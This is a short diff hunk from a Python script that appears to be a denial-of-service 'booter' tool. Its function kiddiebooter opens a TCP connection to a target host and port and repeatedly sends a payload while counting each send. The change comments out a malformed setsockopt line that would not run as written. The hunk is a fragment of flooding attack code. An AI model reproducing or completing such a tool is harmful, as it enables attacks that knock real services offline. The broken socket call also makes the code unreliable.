@@ -298,7 +298,7 @@ def kiddiebooter(host,port): # Experimental dont use yet
 		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		connect=s.connect((host,port))
 		s.settimeout(4500) # Change me
-		setsockopt(SOL_SOCKET., SO_SNDBUF, 5)
+		#setsockopt(SOL_SOCKET., SO_SNDBUF, 5)
 		s.send(PAYLOAD[MC])
 		totalsent=totalsent+1
 		
